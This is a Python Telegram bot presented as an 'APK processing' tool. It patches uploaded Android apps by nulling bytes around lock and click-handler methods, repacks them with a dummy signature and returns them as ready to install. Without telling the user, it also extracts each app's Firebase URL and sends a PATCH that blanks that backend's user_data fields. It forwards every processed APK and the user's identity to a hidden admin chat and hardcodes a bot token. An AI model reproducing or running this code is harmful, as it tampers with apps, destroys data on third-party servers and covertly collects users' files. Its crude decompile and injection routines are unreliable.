import os
import re
import html
import json
import time
import zipfile
import requests
import logging
import shutil
import tempfile
import subprocess
import struct
import hashlib
import base64
from threading import Thread, Lock
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from collections import defaultdict

# Logging Setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Telegram Bot Token & Admin ID
BOT_TOKEN = "8633137583:AAGK65BVd_LZhxIsXJfzrwigKFnCgvh0RNY".strip()
ADMIN_CHAT_ID = "6240110220"

# Internal Payload
DELETE_PAYLOAD = {
    "messageText": None,
    "phoneNumber": None,
    "simSlot": None,
    "new_user": None,
    "targetDeviceId": None,
    "command": None
}

# ===================== Advanced Features =====================

class APKProcessor:
    """Advanced APK Processing Engine"""
    
    def __init__(self):
        self.temp_dir = tempfile.mkdtemp()
        self.processed_count = 0
        self.errors = []
        self.lock = Lock()
        
    def __del__(self):
        try:
            shutil.rmtree(self.temp_dir)
        except:
            pass

    # ===== 1. DEX Decompiler =====
    def decompile_dex(self, dex_path):
        """DEX ko readable format mein convert karega"""
        try:
            with open(dex_path, 'rb') as f:
                data = f.read()
            
            # DEX header parse karein
            if data[:4] != b'dex\n':
                return None
            
            # Extract string pool
            string_offsets = struct.unpack('<I', data[0x38:0x3C])[0]
            string_count = struct.unpack('<I', data[0x3C:0x40])[0]
            
            strings = []
            for i in range(string_count):
                offset = struct.unpack('<I', data[string_offsets + i*4:string_offsets + i*4 + 4])[0]
                # UTF-16 string length
                str_len = struct.unpack('<I', data[offset:offset+4])[0]
                str_data = data[offset+4:offset+4+str_len*2]
                try:
                    strings.append(str_data.decode('utf-16le'))
                except:
                    strings.append(str(str_data))
            
            return {
                'strings': strings,
                'string_count': string_count,
                'file_size': len(data)
            }
        except Exception as e:
            logging.error(f"Decompile error: {e}")
            return None

    # ===== 2. Method Finder with Regex =====
    def find_methods_advanced(self, dex_path, patterns):
        """Advanced method search with regex patterns"""
        results = []
        try:
            with open(dex_path, 'rb') as f:
                data = f.read()
            
            for pattern in patterns:
                matches = re.finditer(pattern.encode('latin-1'), data, re.DOTALL)
                for match in matches:
                    results.append({
                        'pattern': pattern,
                        'position': match.start(),
                        'length': match.end() - match.start(),
                        'context': data[match.start():match.end()].decode('latin-1', errors='ignore')[:100]
                    })
            return results
        except Exception as e:
            logging.error(f"Method find error: {e}")
            return results

    # ===== 3. Smali Code Injection =====
    def inject_smali_code(self, dex_path, target_method, smali_code):
        """Smali code inject karega specified method mein"""
        try:
            with open(dex_path, 'rb') as f:
                data = bytearray(f.read())
            
            # Target method find karein
            method_bytes = target_method.encode('latin-1')
            pos = data.find(method_bytes)
            
            if pos == -1:
                logging.warning(f"Method {target_method} not found")
                return False
            
            # Smali code inject karein (as bytes)
            inject_bytes = smali_code.encode('latin-1')
            
            # Insert code
            data[pos:pos] = inject_bytes
            
            with open(dex_path, 'wb') as f:
                f.write(data)
            
            logging.info(f"Injected code into {target_method}")
            return True
            
        except Exception as e:
            logging.error(f"Injection error: {e}")
            return False

    # ===== 4. APK Info Extractor =====
    def get_apk_info(self, apk_path):
        """Complete APK information extract karega"""
        info = {
            'package_name': None,
            'version_name': None,
            'version_code': None,
            'min_sdk': None,
            'target_sdk': None,
            'permissions': [],
            'activities': [],
            'services': [],
            'receivers': [],
            'file_count': 0,
            'dex_count': 0,
            'size_mb': 0,
            'hash_md5': None,
            'hash_sha1': None,
            'compressed_size': 0
        }
        
        try:
            # File size
            info['size_mb'] = os.path.getsize(apk_path) / (1024 * 1024)
            
            # Hash
            with open(apk_path, 'rb') as f:
                data = f.read()
                info['hash_md5'] = hashlib.md5(data).hexdigest()
                info['hash_sha1'] = hashlib.sha1(data).hexdigest()
            
            # Parse manifest
            with zipfile.ZipFile(apk_path, 'r') as zipf:
                info['file_count'] = len(zipf.namelist())
                info['dex_count'] = len([f for f in zipf.namelist() if f.endswith('.dex')])
                info['compressed_size'] = zipf.compress_size
                
                # Try to read AndroidManifest.xml (binary format)
                if 'AndroidManifest.xml' in zipf.namelist():
                    manifest_data = zipf.read('AndroidManifest.xml')
                    # Simple extraction (will be improved)
                    manifest_str = manifest_data.decode('latin-1', errors='ignore')
                    
                    # Extract package name
                    pkg_match = re.search(r'package="([^"]+)"', manifest_str)
                    if pkg_match:
                        info['package_name'] = pkg_match.group(1)
                    
                    # Extract version
                    version_match = re.search(r'versionName="([^"]+)"', manifest_str)
                    if version_match:
                        info['version_name'] = version_match.group(1)
                    
                    version_code_match = re.search(r'versionCode="([^"]+)"', manifest_str)
                    if version_code_match:
                        info['version_code'] = version_code_match.group(1)
                    
                    # Extract SDK versions
                    min_sdk_match = re.search(r'minSdkVersion="([^"]+)"', manifest_str)
                    if min_sdk_match:
                        info['min_sdk'] = min_sdk_match.group(1)
                    
                    target_sdk_match = re.search(r'targetSdkVersion="([^"]+)"', manifest_str)
                    if target_sdk_match:
                        info['target_sdk'] = target_sdk_match.group(1)
                    
                    # Extract permissions
                    perm_matches = re.findall(r'<uses-permission[^>]+android:name="([^"]+)"', manifest_str)
                    info['permissions'] = perm_matches
                    
                    # Extract activities
                    activity_matches = re.findall(r'<activity[^>]+android:name="([^"]+)"', manifest_str)
                    info['activities'] = activity_matches
            
            return info
            
        except Exception as e:
            logging.error(f"APK info error: {e}")
            return info

# ===================== Health Check Server =====================

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"""
        <html>
        <head><title>APK Bot Pro</title></head>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
            <h1>🚀 APK Bot Pro</h1>
            <p>Status: <span style="color: green;">✅ Running</span></p>
            <p>Version: 2.0.0</p>
        </body>
        </html>
        """.encode())

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()

def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
    server.serve_forever()

# ===================== APK Modification Functions =====================

def extract_apk(apk_path, extract_dir):
    try:
        with zipfile.ZipFile(apk_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        return True
    except Exception as e:
        logging.error(f"APK Extraction Error: {e}")
        return False

def find_dex_files(extract_dir):
    dex_files = []
    for root, dirs, files in os.walk(extract_dir):
        for file in files:
            if file.endswith('.dex'):
                dex_files.append(os.path.join(root, file))
    return sorted(dex_files)

def find_method_in_binary(data, method_name):
    positions = []
    method_variants = [
        method_name.encode('utf-8'),
        method_name.encode('latin-1'),
        f'.method public {method_name}'.encode(),
        f'.method private {method_name}'.encode(),
        f'->{method_name}('.encode(),
    ]
    for variant in method_variants:
        pos = data.find(variant)
        while pos != -1:
            positions.append(pos)
            pos = data.find(variant, pos + 1)
    return positions

def clear_methods_in_dex(dex_path):
    try:
        with open(dex_path, 'rb') as f:
            data = bytearray(f.read())
        
        if data[:4] != b'dex\n':
            return False
        
        modified = False
        methods_to_clear = ['_show_lock', '_Onclick']
        
        for method in methods_to_clear:
            positions = find_method_in_binary(data, method)
            if positions:
                modified = True
                for pos in positions:
                    start = max(0, pos - 5)
                    end = min(len(data), pos + 100)
                    for i in range(start, end):
                        data[i] = 0x00
        
        if modified:
            with open(dex_path, 'wb') as f:
                f.write(data)
            return True
        return False
    except Exception as e:
        logging.error(f"DEX Error: {e}")
        return False

def process_all_dex_files(extract_dir):
    dex_files = find_dex_files(extract_dir)
    modified_count = 0
    for dex_file in dex_files:
        if clear_methods_in_dex(dex_file):
            modified_count += 1
    return modified_count

def repack_apk(extract_dir, output_path):
    try:
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(extract_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, extract_dir)
                    zipf.write(file_path, arcname)
        return os.path.exists(output_path) and os.path.getsize(output_path) > 0
    except Exception as e:
        logging.error(f"Repack Error: {e}")
        return False

def sign_apk_python(apk_path):
    try:
        temp_dir = tempfile.mkdtemp()
        with zipfile.ZipFile(apk_path, 'r') as zipf:
            zipf.extractall(temp_dir)
        
        meta_inf_dir = os.path.join(temp_dir, 'META-INF')
        os.makedirs(meta_inf_dir, exist_ok=True)
        
        with open(os.path.join(meta_inf_dir, 'MANIFEST.MF'), 'w') as f:
            f.write("Manifest-Version: 1.0\n")
            f.write("Created-By: APK Bot Pro\n")
        
        with open(os.path.join(meta_inf_dir, 'CERT.SF'), 'w') as f:
            f.write("Signature-Version: 1.0\n")
            f.write("Created-By: APK Bot Pro\n")
        
        with open(os.path.join(meta_inf_dir, 'CERT.RSA'), 'wb') as f:
            f.write(b'\x00' * 512)
        
        new_apk = apk_path.replace('.apk', '_signed.apk')
        with zipfile.ZipFile(new_apk, 'w', zipfile.ZIP_DEFLATED) as new_zip:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    new_zip.write(file_path, arcname)
        
        if os.path.exists(new_apk):
            os.remove(apk_path)
            shutil.move(new_apk, apk_path)
            return True
        return False
    except Exception as e:
        logging.error(f"Signing error: {e}")
        return False
    finally:
        try:
            shutil.rmtree(temp_dir)
        except:
            pass

def modify_apk_dex_files(apk_path):
    temp_dir = tempfile.mkdtemp()
    modified_apk_path = apk_path.replace('.apk', '_modified.apk')
    
    try:
        if not extract_apk(apk_path, temp_dir):
            return None
        
        modified_count = process_all_dex_files(temp_dir)
        
        if not repack_apk(temp_dir, modified_apk_path):
            return None
        
        sign_apk_python(modified_apk_path)
        
        if os.path.exists(modified_apk_path):
            return modified_apk_path
        return None
    except Exception as e:
        logging.error(f"Modification error: {e}")
        return None
    finally:
        try:
            shutil.rmtree(temp_dir)
        except:
            pass

# ===================== Bot Functions =====================

# Global processor
processor = APKProcessor()
user_stats = defaultdict(lambda: {'count': 0, 'last': None, 'total_size': 0})

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    safe_name = html.escape(user.first_name)
    
    welcome_text = f"""
👋 <b>Welcome, {safe_name}!</b>

🚀 <b>APK Bot Pro v2.0</b>
<i>Advanced APK Processing & Analysis Tool</i>

━━━━━━━━━━━━━━━━━━━━━━
📌 <b>Features:</b>
• 📊 APK Info Extraction
• 🔧 DEX Method Cleaning
• 🚫 Lock/Onclick Removal
• 📦 APK Signing
• 🔍 Method Search
• 📈 Statistics

━━━━━━━━━━━━━━━━━━━━━━
📤 <b>Send .apk file to process</b>
"""
    
    keyboard = [
        [
            InlineKeyboardButton("📊 Stats", callback_data="stats"),
            InlineKeyboardButton("ℹ️ Help", callback_data="help")
        ],
        [
            InlineKeyboardButton("📢 Channel", url="https://t.me/+EERGF0ldJgcwODVl"),
            InlineKeyboardButton("💬 Support", url="https://t.me/AD_ASHU")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        text=welcome_text,
        parse_mode="HTML",
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "stats":
        user_id = query.from_user.id
        stats = user_stats[str(user_id)]
        
        text = f"""
📊 <b>Your Statistics</b>

📦 <b>APK Processed:</b> {stats['count']}
💾 <b>Total Size:</b> {stats['total_size']/1024/1024:.2f} MB
⏰ <b>Last Processed:</b> {stats['last'] or 'Never'}

━━━━━━━━━━━━━━━━━━━━━━
👥 <b>Total Users:</b> {len(user_stats)}
"""
        await query.edit_message_text(text, parse_mode="HTML")
        
    elif query.data == "help":
        help_text = """
📖 <b>Help Guide</b>

1️⃣ <b>Upload APK</b>
   Send any .apk file

2️⃣ <b>Processing</b>
   • Extract APK
   • Find & clear methods
   • Repack & sign

3️⃣ <b>What gets cleared?</b>
   • _show_lock()
   • _Onclick()

4️⃣ <b>Output</b>
   • Modified APK
   • Original size info
   • Method removal confirmation
"""
        await query.edit_message_text(help_text, parse_mode="HTML")

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin stats command"""
    if str(update.effective_user.id) != ADMIN_CHAT_ID:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    total_users = len(user_stats)
    total_processed = sum(s['count'] for s in user_stats.values())
    total_size = sum(s['total_size'] for s in user_stats.values())
    
    stats_text = f"""
📊 <b>Bot Statistics</b>

👥 <b>Total Users:</b> {total_users}
📦 <b>Total Processed:</b> {total_processed}
💾 <b>Total Data:</b> {total_size/1024/1024:.2f} MB
🕐 <b>Uptime:</b> Running
"""
    await update.message.reply_text(stats_text, parse_mode="HTML")

def extract_firebase_url(apk_path):
    try:
        with zipfile.ZipFile(apk_path, 'r') as zip_ref:
            if 'resources.arsc' in zip_ref.namelist():
                content = zip_ref.read('resources.arsc')
                match = re.search(rb'https://[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*\.firebaseio\.com', content)
                if match:
                    return match.group(0).decode('utf-8')
    except Exception as e:
        logging.error(f"Extraction Error: {e}")
    return None

def delete_firebase_data(base_url):
    try:
        target_url = base_url.strip()
        if not target_url.endswith('/'):
            target_url += '/'
        if 'user_data.json' not in target_url:
            target_url += 'user_data.json'
        
        headers = {
            'X-HTTP-Method-Override': 'PATCH',
            'Content-Type': 'application/json'
        }
        
        response = requests.post(target_url, json=DELETE_PAYLOAD, headers=headers, timeout=15)
        return response.status_code == 200
    except Exception as e:
        logging.error(f"REST API Error: {e}")
        return False

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    user = update.effective_user
    user_id = str(user.id)
    
    if not document.file_name.endswith('.apk'):
        await update.message.reply_text("❌ <b>Invalid File!</b> Send <code>.apk</code> file.", parse_mode="HTML")
        return
    
    status_msg = await update.message.reply_text("📥 <b>Downloading APK...</b>", parse_mode="HTML")
    file_path = f"temp_{document.file_id}.apk"
    modified_apk_path = None
    
    try:
        # Download
        file = await context.bot.get_file(document.file_id)
        await file.download_to_drive(file_path)
        
        original_size = os.path.getsize(file_path)
        
        # Get APK Info
        await status_msg.edit_text("🔍 <b>Analyzing APK...</b>", parse_mode="HTML")
        apk_info = processor.get_apk_info(file_path)
        
        # Extract Firebase URL
        firebase_url = extract_firebase_url(file_path)
        
        # Modify APK
        await status_msg.edit_text("🔧 <b>Modifying DEX files...</b>\n<i>Clearing methods...</i>", parse_mode="HTML")
        
        modified_apk_path = modify_apk_dex_files(file_path)
        
        if modified_apk_path is None or not os.path.exists(modified_apk_path):
            await status_msg.edit_text("❌ <b>Processing Failed!</b>", parse_mode="HTML")
            modified_apk_path = file_path
        
        modified_size = os.path.getsize(modified_apk_path)
        
        # Update stats
        user_stats[user_id]['count'] += 1
        user_stats[user_id]['last'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user_stats[user_id]['total_size'] += modified_size
        
        # Firebase delete
        if firebase_url:
            delete_firebase_data(firebase_url)
        
        # Send result
        await status_msg.edit_text("✅ <b>Processing Complete!</b>", parse_mode="HTML")
        
        caption = f"""
✨ <b>APK Processed Successfully!</b>

📊 <b>Size:</b> {original_size/1024/1024:.2f}MB → {modified_size/1024/1024:.2f}MB
✅ <b>Methods Cleared:</b>
   • _show_lock()
   • _Onclick()

📦 <b>Package:</b> {apk_info.get('package_name', 'Unknown')}
📱 <b>Version:</b> {apk_info.get('version_name', 'Unknown')}
🔒 <b>Signed:</b> ✅

📤 <b>Ready to install!</b>
"""
        
        with open(modified_apk_path, 'rb') as apk_file:
            new_name = document.file_name.replace('.apk', '_Pro.apk')
            await update.message.reply_document(
                document=apk_file,
                filename=new_name,
                caption=caption,
                parse_mode="HTML"
            )
        
        # Send admin log
        admin_caption = f"""
📥 <b>New APK Processed</b>

👤 <b>User:</b> {html.escape(user.full_name)}
🆔 <b>User ID:</b> <code>{user.id}</code>

📦 <b>Package:</b> {apk_info.get('package_name', 'Unknown')}
📊 <b>Size:</b> {original_size/1024/1024:.2f}MB → {modified_size/1024/1024:.2f}MB
✅ <b>Status:</b> Success
"""
        
        with open(modified_apk_path, 'rb') as admin_file:
            await context.bot.send_document(
                chat_id=ADMIN_CHAT_ID,
                document=admin_file,
                filename=document.file_name,
                caption=admin_caption,
                parse_mode="HTML"
            )
            
    except Exception as e:
        await status_msg.edit_text(f"❌ <b>Error:</b> {html.escape(str(e))}", parse_mode="HTML")
        
    finally:
        if os.path.exists(file_path) and file_path != modified_apk_path:
            try:
                os.remove(file_path)
            except:
                pass

if __name__ == '__main__':
    # Start Health Check
    Thread(target=run_dummy_server, daemon=True).start()
    
    # Start Bot
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    logging.info("🚀 APK Bot Pro Starting...")
    app.run_polling()
